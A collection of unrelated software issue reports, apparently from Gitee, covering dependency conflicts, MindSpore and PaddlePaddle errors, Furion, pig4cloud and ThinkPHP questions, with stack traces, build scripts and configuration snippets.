报错，找不到类BouncyCastleProvider,你好： 我有个问题，我启动报错 然后排除bcpkix-jdk15on的1.5.9版本 就行了   <code>: &lt;dependency&gt; &lt;groupId&gt;com.yami.shop&lt;/groupId&gt; &lt;artifactId&gt;yami-shop-service&lt;/artifactId&gt; &lt;version&gt;${yami.shop.version}&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;bcpkix-jdk15on&lt;/artifactId&gt; &lt;groupId&gt;org.bouncycastle&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;
"For primitive[AddN], the input type must be same","【Issues Section】/【问题文档片段】 【Existing Issues】/【存在的问题】 <ol start=""4""> 【Expected Result】【预期结果】 Please fill in the expected result   <code>: Traceback (most recent call last): File ""main_new_opt_time_1125.py"", line 99, in &lt;module&gt; bev_grid, mapinfo, rlt_np = nerf(bevconfig, scene) File ""/home/ma-user/work/chushuai/mindspore-pipeline/src/run_nerf_optimization_seg_1125.py"", line 309, in nerf model = train_nerf(args) File ""/home/ma-user/work/chushuai/mindspore-pipeline/src/run_nerf_optimization_seg_1125.py"", line 209, in train_nerf output = train_net_seg(coord_xy_tensor, grid_xy_tensor_embed, height, seg_labels_iter_tensor,trans_iter) File ""/home/ma-user/anaconda3/envs/MindSpore/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 591, in __call__ out = self.compile_and_run(*args) File ""/home/ma-user/anaconda3/envs/MindSpore/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 979, in compile_and_run self.compile(*inputs) File ""/home/ma-user/anaconda3/envs/MindSpore/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 951, in compile jit_config_dict=self._jit_config_dict) File ""/home/ma-user/anaconda3/envs/MindSpore/lib/python3.7/site-packages/mindspore/common/api.py"", line 1130, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) TypeError: For primitive[AddN], the input type must be same. name:[element_0]:Tensor[Bool]. name:[element_1]:Tensor[Float32]. ---------------------------------------------------- - The Traceback of Net Construct Code: ---------------------------------------------------- The function call stack (See file '/home/ma-user/work/chushuai/mindspore-pipeline/src/rank_0/om/analyze_fail.dat' for more details. Get instructions about `analyze_fail.dat` at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): # 0 In file /home/ma-user/anaconda3/envs/MindSpore/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py(381) grads = self.grad(self.network, self.weights)(*inputs, sens) ^ # 1 In file /home/ma-user/anaconda3/envs/MindSpore/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/add_impl.py(352) return F.addn((x, y)) ^ # 2 In file /home/ma-user/anaconda3/envs/MindSpore/lib/python3.7/site-packages/mindspore/ops/function/math_func.py(198) return addn_(x) ^ ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/core/utils/check_convert_utils.cc:706 _CheckTypeSame [ERROR] DEVICE(2404758,ffff891690b0,python):2022-12-01-18:13:12.275.828 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_deprecated_interface.cc:327] CloseTsd] Ascend error occurred, error message: EE9999: Inner Error! EE9999 DeviceReset failed, deviceId=6, retCode=0x7070003[FUNC:DeviceReset][FILE:api_impl.cc][LINE:1609] rtDeviceReset execute failed, reason=[context release error][FUNC:FuncErrorReason][FILE:error_message_manage.cc][LINE:49] Error in atexit._run_exitfuncs: RuntimeError: Device 6 call rtDeviceReset failed, ret[507007]"
 支持 `JWTEncryption` 无注册使用,"支持 无需调用 注册使用。 相关资料 #I5POLZ:web项目token生成 功能清单 支持 静态类无无需注册使用 编写更新日志内容 期望效果 在没有调用 情况下调用。 !555: 支持 `JWTEncryption` 无注册使用   <code>: JWTEncryption .AddJwt() JWTEncryption var token = JWTEncryption.Encrypt(new Dictionary&lt;string, object&gt; { {""UserId"",1 } }, 10); services.AddJwt()"
[CT][MS][OP]linalg.cholesky  some args have no default value and example result not same as actual value,": GPU /CPU /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 检查linalg.cholesky 接口描述 1.官网没有linalg.cholesky接口资料 检查源码mindspore.scipy.linalg 里的接口cholesky， 发现有如下问题： 2.lower 支持的数据类型是bool, 默认值为""upper-triangular"", 建议修改成bool值False 3.overwrite_a 是可选参数，没有列出默认值 4.check_finite是可选参数， 没有列出默认值 5.Raises里描述需要确认是否正确，目前没有这种报错类型 6.样例在GPU环境上执行，实际输出值如下， 与样例给出的值不一致，需进一步确认是否正确；CPU上执行结果与样例一致 __________________________________________________ [doctest] mindspore.scipy.linalg.cholesky __ 281 Supported Platforms: 282 283 284 Examples: 285 &gt;&gt;&gt; import numpy as onp 286 &gt;&gt;&gt; from mindspore.common import Tensor 287 &gt;&gt;&gt; from mindspore.scipy.linalg import cholesky 288 &gt;&gt;&gt; a = Tensor(onp.array([[1, -2],[2, 5]]).astype(onp.float32)) 289 &gt;&gt;&gt; L = cholesky(a, lower=True) 290 &gt;&gt;&gt; L Differences (unified diff with -expected +actual): @@ -1,3 +1,3 @@ Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 0.00000000e+00], - [ 2.00000000e+00, 1.00000000e+00]]) + [-2.00000000e+00, 1.00000000e+00]]) 原接口描述如下： 如上描述   <code>: lower (bool, optional): Whether to compute the upper- or lower-triangular Cholesky factorization. Default is upper-triangular. overwrite_a (bool, optional): Whether to overwrite data in `a` (may improve performance). check_finite (bool, optional): Whether to check that the input matrix contains only finite numbers. Disabling may give a performance gain, but may result in problems (crashes, non-termination) if the inputs do contain infinities or NaNs. Raises: LinAlgError: if decomposition fails. Examples: &gt;&gt;&gt; import numpy as onp &gt;&gt;&gt; from mindspore.common import Tensor &gt;&gt;&gt; from mindspore.scipy.linalg import cholesky &gt;&gt;&gt; a = Tensor(onp.array([[1, -2],[2, 5]]).astype(onp.float32)) &gt;&gt;&gt; L = cholesky(a, lower=True) &gt;&gt;&gt; L Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 0.00000000e+00], [ 2.00000000e+00, 1.00000000e+00]])"
getHtml().links()无法准确获取a标签中的相对链接,"问题描述：getHtml().links()无法准确获取a标签中的相对链接 期望：准确获取html内容中所有链接包括相对链接 实际：无法准确获取相对链接 html片段： 代码片段：   <code>: &lt;div class=""ui menu""&gt; &lt;a href=""/explore"" class=""item""&gt;开源软件&lt;/a&gt; &lt;a href=""/enterprises"" class=""item""&gt;企业版&lt;/a&gt; &lt;a href=""/education"" class=""item""&gt;高校版&lt;/a&gt; &lt;a href=""https://blog.gitee.com/"" class=""item""&gt;博客&lt;/a&gt; &lt;/div&gt; String html = ""&lt;div&gt;......&lt;/div&gt;""; Page page = new Page(); page.setRequest(new Request(""https://gitee.com"")); page.setUrl(new PlainText(""https://gitee.com"")); page.setHtml(new Html(html)); System.out.println(page.getHtml().links());"
什么时候支持poi4呀,使用的JDK版本和Hutool版本 jdk 1.8 hutool 4.6.4 和easypoi冲突了 java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.Cell.getCellType()Lorg/apache/poi/ss/usermodel/CellType;   <code>: at cn.afterturn.easypoi.util.PoiCellUtil.getCellValue(PoiCellUtil.java:117) at cn.afterturn.easypoi.excel.imports.ExcelImportService.getKeyValue(ExcelImportService.java:134) at cn.afterturn.easypoi.excel.imports.ExcelImportService.getTitleMap(ExcelImportService.java:367) at cn.afterturn.easypoi.excel.imports.ExcelImportService.importExcel(ExcelImportService.java:176) at cn.afterturn.easypoi.excel.imports.ExcelImportService.importExcelByIs(ExcelImportService.java:462) at cn.afterturn.easypoi.excel.ExcelImportUtil.importExcel(ExcelImportUtil.java:61) at com.jsfkhealth.shop.supply.SpringTest.excel(SpringTest.java:46) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) at com.intellij.rt.execution.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:47) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:242) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:70)
导出图片不报任何错误，就是出不来,"用的javase写的   <code>: List&lt;KHUser2&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 100; i++) { KHUser2 user = new KHUser2(); user.setStaffNo(""x-"" + i); user.setName(""张三""); user.setSrc(getBytes(""/Users/HOHD/tmp-file/138.png"")); list.add(user); } ExportParams params = new ExportParams(null, ""测试"", ExcelType.XSSF); Workbook workbook = null; workbook = ExcelExportUtil.exportExcel(params, KHUser2.class, list); FileOutputStream fos = new FileOutputStream(""/Users/HOHD/tmp-file/123.xlsx""); workbook.write(fos); private String id; @Excel(name = ""姓名"") private String name; @Excel(name = ""昵称"") private String nickName; @Excel(name = ""密码"") private String password; @Excel(name = ""工号"") private String staffNo;// 员工编号 @JsonFormat(pattern = ""yyyy-MM-dd HH:mm:ss"", locale = ""zh"" , timezone=""GMT+8"") private Date createTime; @Excel(name=""部门"") private String department; @Excel(name=""二维码"",type = 2 ) private byte[] src;"
根据archetype新建模块，路径非com.pig4cloud.xxx。启动报错。,pig版本:3.0.2 是否修改包名: 是 1.空文件夹下执行命令创建新模块 mvn archetype:generate -DgroupId=com.example -DartifactId=simple -Dversion=1.0.0-SNAPSHOT -Dpackage=com.example.simple -DarchetypeGroupId=com.pig4cloud.archetype -DarchetypeArtifactId=pig-gen -DarchetypeVersion=3.0.2 -DarchetypeCatalog=local 2.将空文件夹下生成的simple文件夹拷贝到项目根目录（即simple文件夹与db、pig-auth/pig-common等文件夹同一级） 3.在项目父pom.xml 手动增加simple 4.修改新模块的pom.xml 将 改成 5.启nacos创建配置文件simple-biz-dev.yml spring security 配置 security: oauth2: client: client-id: pig client-secret: pig scope: server 数据源配置 spring: datasource: type: com.zaxxer.hikari.HikariDataSource driver-class-name: com.mysql.cj.jdbc.Driver username: root password: root url: jdbc:mysql://pig-mysql:3306/simple?characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=Asia/Shanghai 6.启动gateway、auth、admin、codegen创建一个表并添加数据源，用代码生成模块生成代码 -DarchetypeCatalog=local Error creating bean with name 'rtsCommercialServiceImpl': Unsatisfied dependency expressed through field 'baseMapper'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.cgnpc.index.mapper.RtsCommercialMapper' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)} Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rtsCommercialServiceImpl': Unsatisfied dependency expressed through field 'baseMapper'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.example.simple.mapper.RtsCommercialMapper' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)} Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.example.simple.mapper.RtsCommercialMapper' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}   <code>: &lt;parent&gt; &lt;groupId&gt;com.pig4cloud&lt;/groupId&gt; &lt;artifactId&gt;pig-cloud-dependencies-parent&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/parent&gt; &lt;parent&gt; &lt;groupId&gt;com.pig4cloud&lt;/groupId&gt; &lt;artifactId&gt;pig&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/parent&gt;
附件具体有哪些格式支持上传,我在附件中上传一个格式的文件提示我不支持。   <code>: *.jar
表格查询要先清空下数据 JeecgListMixin.js,版本号： master 表格查询前需要清空下数据再加载。目前这样假设首次加载没问题，后续查询出问题的时候数据会一直在，用户会误以为一切正常。 JeecgListMixin.js 友情提示： 未按格式要求发帖，会直接删掉。   <code>: methods: { loadData(arg) { // 表格数据重置 this.dataSource = [] this.ipagination.total = 1 ... }
Several enhancement for code,"Backward always infer shape &amp; infer var type. Since there are RENAME variables will be created when creating backward operator, but their shape &amp; var types are not inferenced. Never use SomePtr-&gt; directly, since every pointer could be nullptr if it is a function return value. Add to cast pointer to reference safely. Enhance error message for backward. Infer data type of variable in and   <code>: detail::Ref sum tensor_write"
Do not support float input in learning rate warmup,"paddle 1.4.1 CPU Just adapt from the document.   <code>: import paddle.fluid as fluid warmup_steps = 50 start_lr = 1. / 3. end_lr = 0.1 decayed_lr = fluid.layers.linear_lr_warmup( 0.2, warmup_steps, start_lr, end_lr)"
notebook写2.2版本波房写入文件中报错ValueError: zero-size array to reduction operation maximum which has no identity    数据集导入的官方.csv波房数据集文件。。。,"#paddle加载paddle。numpy。os。random库调用paddle内神经层函数 import paddle from paddle.nn import Linear import paddle.nn.functional as F import numpy as np import os import random #导入数据，处理数据 def load_data(): #导入文件 datafile = 'data/data9072/housingPrices_train.csv' data = np.fromfile(datafile, sep=' ', dtype=np.float32) #每条数据包括14项，前面13项为因素，后一项为中位数 feature_names = ['CRIM', 'ZN', 'INDUS', 'CHAS', 'NOX', 'RM', 'AGE', 'DIS', 'RAD', 'TAX', 'PTRATIO', 'B', 'LSTAT', 'MEDV' ] feature_num = len(feature_names) #将原始数据重塑，变成（n*14） data = data.reshape([data.shape[0] // feature_num, feature_num]) class Regressor(paddle.nn.Layer): #声明定义好的线性回归模型 model = Regressor() 开启模型训练模式 model.train() 加载数据# training_data, test_data = load_data() 定义优化算法，使用随机梯度下降SGD 学习率设置为0.01 opt = paddle.optimizer.SGD(learning_rate=0.01, parameters=model.parameters())   <code>: #将数据集拆分成训练集与测试集 #80%的训练，20%的测试，（测试与训练无交集？） ratio = 0.8 offset = int(data.shape[0] * ratio) training_data = data[:offset] #计算train 最大值 最小值 平均值 maximums,minimums,avgs = training_data.max(axis=0), training_data.min(axis=0), \ training_data.sum(axis=0) / training_data.shape[0] #记录数据归一化处理 global max_values global min_values global avg_values max_values = maximums min_values = minimums avg_values = avgs #对数据进行归一化处理 for i in range (feature_num): data[:, i] = (data[:,i]-avg[i]) / (maximums[i] - minimums[i]) #训练集与测试集划分比例 training_data = data[:offset] test_data = data[offset:] return training_data,test_data # self代表类的实例自身 def __init__(self): # 初始化父类中的一些参数 super(Regressor, self).__init__() # 定义一层全连接层，输入维度是13，输出维度是1 self.fc = Linear(in_features=13, out_features=1) # 网络的前向计算 def forward(self, inputs): x = self.fc(inputs) return x"
[EDVR] [310推理] MindIR报错,"Steps to reproduce the issue / 重现步骤 推理脚本运行指令 run_infer_310.sh脚本内容 Related log / screenshot / 日志 / 截图 Describe the expected behavior / 预期结果 程序及训练数据集 链接：310代码   <code>: model.Build()调用出错 1、进行310推理时，需要将模型的mindir文件导入 2、导入rdn模型的mindir文件进行推理时，发生报错。（下图(1)） 3、定位到代码第79行，得知model.build()函数出错（下图(2)） bash run_infer_310.sh /home/stu/yyz/models/research/cv/EDVR_infence_310/checkpoint_EDVR_model.mindir /home/stu/yyz/models/research/cv/EDVR_infence_310/dateset vimeo90k 4 0 #!/bin/bash # Copyright 2021 Huawei Technologies Co., Ltd # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ============================================================================ if [[ $# -lt 3 || $# -gt 5 ]]; then echo ""Usage: bash run_infer_310.sh [MINDIR_PATH] [DATA_PATH] [DATASET_TYPE] [SCALE] [DEVICE_ID]"" exit 1 fi get_real_path(){ if [ ""${1:0:1}"" == ""/"" ]; then echo ""$1"" else echo ""$(realpath -m $PWD/$1)"" fi } model=$(get_real_path $1) data_path=$(get_real_path $2) dataset_type=$3 scale=$4 if [[ $scale -ne ""2"" &amp;&amp; $scale -ne ""3"" &amp;&amp; $scale -ne ""4"" ]]; then echo ""[SCALE] should be in [2,3,4]"" exit 1 fi device_id=0 if [ $# == 5 ]; then device_id=$5 fi log_file=""./run_infer.log"" log_file=$(get_real_path $log_file) echo ""***************** param *****************"" echo ""mindir name: ""$model echo ""dataset path: ""$data_path echo ""scale: ""$scale echo ""log file: ""$log_file echo ""***************** param *****************"" export ASCEND_HOME=/usr/local/Ascend/ if [ -d ${ASCEND_HOME}/ascend-toolkit ]; then export PATH=$ASCEND_HOME/fwkacllib/bin:$ASCEND_HOME/fwkacllib/ccec_compiler/bin:$ASCEND_HOME/ascend-toolkit/latest/fwkacllib/ccec_compiler/bin:$ASCEND_HOME/ascend-toolkit/latest/atc/bin:$PATH export LD_LIBRARY_PATH=$ASCEND_HOME/fwkacllib/lib64:/usr/local/lib:$ASCEND_HOME/ascend-toolkit/latest/atc/lib64:$ASCEND_HOME/ascend-toolkit/latest/fwkacllib/lib64:$ASCEND_HOME/driver/lib64:$ASCEND_HOME/add-ons:$LD_LIBRARY_PATH export TBE_IMPL_PATH=$ASCEND_HOME/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe export PYTHONPATH=$ASCEND_HOME/fwkacllib/python/site-packages:${TBE_IMPL_PATH}:$ASCEND_HOME/ascend-toolkit/latest/fwkacllib/python/site-packages:$PYTHONPATH export ASCEND_OPP_PATH=$ASCEND_HOME/ascend-toolkit/latest/opp else export ASCEND_HOME=/usr/local/Ascend/latest/ export PATH=$ASCEND_HOME/fwkacllib/bin:$ASCEND_HOME/fwkacllib/ccec_compiler/bin:$ASCEND_HOME/atc/ccec_compiler/bin:$ASCEND_HOME/atc/bin:$PATH export LD_LIBRARY_PATH=$ASCEND_HOME/fwkacllib/lib64:/usr/local/lib:$ASCEND_HOME/atc/lib64:$ASCEND_HOME/acllib/lib64:$ASCEND_HOME/driver/lib64:$ASCEND_HOME/add-ons:$LD_LIBRARY_PATH export PYTHONPATH=$ASCEND_HOME/fwkacllib/python/site-packages:$ASCEND_HOME/atc/python/site-packages:$PYTHONPATH export ASCEND_OPP_PATH=$ASCEND_HOME/opp fi export PYTHONPATH=$PWD:$PYTHONPATH function compile_app() { echo ""begin to compile app..."" cd ../ascend310_infer || exit bash build.sh &gt;&gt; $log_file 2&gt;&amp;1 cd - echo ""finish compile app"" } function preprocess() { echo ""begin to preprocess..."" export DEVICE_ID=$device_id export RANK_SIZE=1 rm -rf ../LR python ../preprocess.py --dataset_path=$data_path --dataset_type=$dataset_type --scale=$scale --save_path=../LR/ &gt;&gt; $log_file 2&gt;&amp;1 echo ""finish preprocess"" } function infer() { echo ""begin to infer..."" save_data_path=$data_path""/SR_bin/X""$scale if [ -d $save_data_path ]; then rm -rf $save_data_path fi mkdir -p $save_data_path ../ascend310_infer/out/main --mindir_path=$model --dataset_path=../LR/ --device_id=0 --save_dir=$save_data_path &gt;&gt; $log_file 2&gt;&amp;1 echo ""finish infer"" } #function postprocess() #{ # echo ""begin to postprocess..."" # export DEVICE_ID=$device_id # export RANK_SIZE=1 # python ../postprocess.py --dataset_path=$data_path --dataset_type=$dataset_type --bin_path=$data_path""/SR_bin/X""$scale --scale=$scale &gt;&gt; $log_file 2&gt;&amp;1 # echo ""finish postprocess"" #} #echo """" &gt; $log_file #echo ""read the log command: "" #echo "" tail -f $log_file"" compile_app if [ $? -ne 0 ]; then echo ""compile app code failed, check $log_file"" exit 1 fi preprocess if [ $? -ne 0 ]; then echo ""preprocess code failed, check $log_file"" exit 1 fi infer if [ $? -ne 0 ]; then echo "" execute inference failed, check $log_file"" exit 1 fi #postprocess #if [ $? -ne 0 ]; then # echo ""postprocess failed, check $log_file"" # exit 1 #fi cat $log_file | tail -n 3 | head -n 1 模型正常加载"
 [新功能] 添加一个便捷的解析 登录用户 Token 存储的信息方法,"目前通过上下文方式获取太繁琐了：   <code>: _httpContextAccessor.HttpContext.User.FindFirstValue(""UserId"")"
[问题]  全局筛选器 没有执行，使用Furion源码调试过，,"Furion 版本号 最新版本 1.10.8 Web 项目类型 WebApi Mvc 发生了什么？ 上下文中 全局筛选器 没有执行 异常堆栈是什么？ 没有异常 代码或代码仓库 什么代码导致？ public sealed class AbcDbContext : AppDbContext,IModelBuilderFilter { public AbcDbContext(DbContextOptions options) : base(options) { EnabledEntityChangedListener = true; 通过挂Furion源码调试，发现 此代码没有执行 AppDbContextBuilder.cs 461行 // 添加全局筛选器 if (entityCorrelationType.HasImplementedRawGeneric(typeof(IPrivateModelBuilderFilter))) { result.ModelBuilderFilterTypes.Add(entityCorrelationType); xSqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 问题解决   <code>: } //public DbSet&lt;AutidLog&gt; AutidLogs { get; set; } #region 全局筛选器 public void OnCreated(ModelBuilder modelBuilder, EntityTypeBuilder entityBuilder, DbContext dbContext, Type dbContextLocator) { //此方法没有执行 } public void OnCreating(ModelBuilder modelBuilder, EntityTypeBuilder entityBuilder, DbContext dbContext, Type dbContextLocator) { //此方法没有执行 var expression = BuilderIsDeleteLambdaExpression(entityBuilder); if (expression == null) return; entityBuilder.HasQueryFilter(expression); } /// &lt;summary&gt; /// 构建 u =&gt; EF.Property&lt;bool&gt;(u, ""IsDeleted"") == false 表达式 /// &lt;/summary&gt; /// &lt;param name=""entityBuilder""&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; private LambdaExpression BuilderIsDeleteLambdaExpression(EntityTypeBuilder entityBuilder) { // 获取实体构建器元数据 var metadata = entityBuilder.Metadata; if (metadata.FindProperty(nameof(Entity.IsDeleted)) == null) return default; // 创建表达式元素 var parameter = Expression.Parameter(metadata.ClrType, ""u""); var properyName = Expression.Constant(nameof(Entity.IsDeleted)); var propertyValue = Expression.Constant(false); // 构建表达式 u =&gt; EF.Property&lt;bool&gt;(u, ""IsDeleted"") == false var expressionBody = Expression.Equal(Expression.Call(typeof(EF), nameof(EF.Property), new[] { typeof(bool) }, parameter, properyName), propertyValue); var expression = Expression.Lambda(expressionBody, parameter); return expression; } #endregion // 判断是否是 DbContext 类型， if (typeof(DbContext).IsAssignableFrom(entityCorrelationType)) { // 判断是否已经注册了上下文并且是否等于当前上下文 if (Penetrates.DbContextWithLocatorCached.Values.Contains(entityCorrelationType) &amp;&amp; entityCorrelationType == dbContext.GetType()) { result.ModelBuilderFilterInstances.Add(dbContext as IPrivateModelBuilderFilter); } } else result.ModelBuilderFilterInstances.Add(Activator.CreateInstance(entityCorrelationType) as IPrivateModelBuilderFilter); }"
帮忙看下tp3项目关于Driver.class.php中查询表达式位置问题,这个limit放在union前面导致sql解析错误，建议limit放在后面   <code>: protected $selectSql = '%COMMENT%SELECT %TIME_LIMIT%%DISTINCT% %FIELD% FROM %TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%';
"[CT][MS][generate]ScatterNdUpdate indices out of range, core dump on CPU","ScatterNdUpdate算子，indices下标越界，CPU上core dump / 硬件环境: Please delete the backend not involved / 请删除不涉及的后端: /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph python raise error [CRITICAL] KERNEL(31837,7fd4961e5700,python):2022-04-11-20:24:21.056.256 [mindspore/ccsrc/plugin/device/cpu/kernel/scatter_nd_update_cpu_kernel.cc:55] Compute] For 'ScatterNdUpdate', memcpy_s error. Error no: 34 terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/plugin/device/cpu/kernel/scatter_nd_update_cpu_kernel.cc:55 Compute] For 'ScatterNdUpdate', memcpy_s error. Error no: 34 Aborted (core dumped)   <code>: from mindspore.common import Parameter from mindspore.common import Tensor import mindspore.ops.operations as P import numpy as np op = P.ScatterNdUpdate() input_x = Parameter(Tensor(np.ones([1, 4, 1], np.float32)), name=""param"") indices = Tensor(np.array([[0, 2], [3, 2], [1, 3]], np.int32)) update = Tensor(np.array([[1], [1], [1]], np.int32)) op(input_x, indices, update)"
3.8新版本，为何登陆会跳转到localhost:3000/token/login页面？,"环境信息 pigx版本: 3.8 是否修改包名: 是 冷总好，帮忙看看可能是什么问题？我做了跨域处理，现在覆盖升级后，登陆有这个问题 怎么 这样的请求,接着就跳到 请指点一下，谢谢。   <code>: http://192.168.0.100:9999/auth/oauth/token?randomStr=37721588126715665&amp;code=-2&amp;grant_type=password， http://192.168.0.100:3000/token/login"
内部一键编译版本，安装报错,"问题不太好描述，我直接把报错信息贴出来吧，请各位大神帮我看一下吧： 【重要说明：这个版本的paddle我之前安装了两台机器，都没问题，新换了一台机器报这个错误，有人说把gcc换成~/.jumbo的gcc,更换之后换了个其他报错，还是安装不下去，因此还是希望不改变原有paddle编译环境，能解决这个问题，如果可以，希望有人能去我的机器上看一下，非常感谢。。。】 还给了error.log 和output.log两个文件，如果需要其中的信息请再评论告之，非常感谢！ 另：我说的内部一键编译版本是这个： git clone http://gitlab.baidu.com/idl-dl/paddle_internal_release_tools.git 然后sh build.sh cpu nonrdma安装的这个版本。   <code>: -- The CXX compiler identification is GNU 4.8.2 -- The C compiler identification is GNU 4.8.2 -- Check for working CXX compiler: /opt/compiler/gcc-4.8.2/bin/g++ -- Check for working CXX compiler: /opt/compiler/gcc-4.8.2/bin/g++ -- broken CMake Error at /home/iknow/.jumbo/share/cmake-3.2/Modules/CMakeTestCXXCompiler.cmake:54 (message): The C++ compiler ""/opt/compiler/gcc-4.8.2/bin/g++"" is not able to compile a simple test program. It fails with the following output: Change Dir: /home/iknow/paddle/paddle_internal_release_tools/idl/paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTryCompileExec2132874655/fast"" /usr/bin/gmake -f CMakeFiles/cmTryCompileExec2132874655.dir/build.make CMakeFiles/cmTryCompileExec2132874655.dir/build gmake[1]: Entering directory `/home/iknow/paddle/paddle_internal_release_tools/idl/paddle/build/CMakeFiles/CMakeTmp' /home/iknow/.jumbo/bin/cmake -E cmake_progress_report /home/iknow/paddle/paddle_internal_release_tools/idl/paddle/build/CMakeFiles/CMakeTmp/CMakeFiles 1 Building CXX object CMakeFiles/cmTryCompileExec2132874655.dir/testCXXCompiler.cxx.o /opt/compiler/gcc-4.8.2/bin/g++ -o CMakeFiles/cmTryCompileExec2132874655.dir/testCXXCompiler.cxx.o -c /home/iknow/paddle/paddle_internal_release_tools/idl/paddle/build/CMakeFiles/CMakeTmp/testCXXCompiler.cxx Linking CXX executable cmTryCompileExec2132874655 /home/iknow/.jumbo/bin/cmake -E cmake_link_script CMakeFiles/cmTryCompileExec2132874655.dir/link.txt --verbose=1 /opt/compiler/gcc-4.8.2/bin/g++ CMakeFiles/cmTryCompileExec2132874655.dir/testCXXCompiler.cxx.o -o cmTryCompileExec2132874655 -rdynamic /home/opt/gcc-4.8.2.bpkg-r2/gcc-4.8.2.bpkg-r2/sbin/../lib/gcc/x86_64-baidu-linux-gnu/4.8.2/../../../../lib64/libstdc++.so: undefined reference to `memcpy@GLIBC_2.14' /home/opt/gcc-4.8.2.bpkg-r2/gcc-4.8.2.bpkg-r2/sbin/../lib/gcc/x86_64-baidu-linux-gnu/4.8.2/../../../../lib64/libstdc++.so: undefined reference to `clock_gettime@GLIBC_2.17' /lib64/libc.so.6: undefined reference to `_dl_out_of_memory@GLIBC_PRIVATE' collect2: error: ld returned 1 exit status gmake[1]: *** [cmTryCompileExec2132874655] Error 1 gmake[1]: Leaving directory `/home/iknow/paddle/paddle_internal_release_tools/idl/paddle/build/CMakeFiles/CMakeTmp' gmake: *** [cmTryCompileExec2132874655/fast] Error 2 CMake will not be able to correctly generate this project. Call Stack (most recent call first): CMakeLists.txt:3 (project) -- Configuring incomplete, errors occurred!"
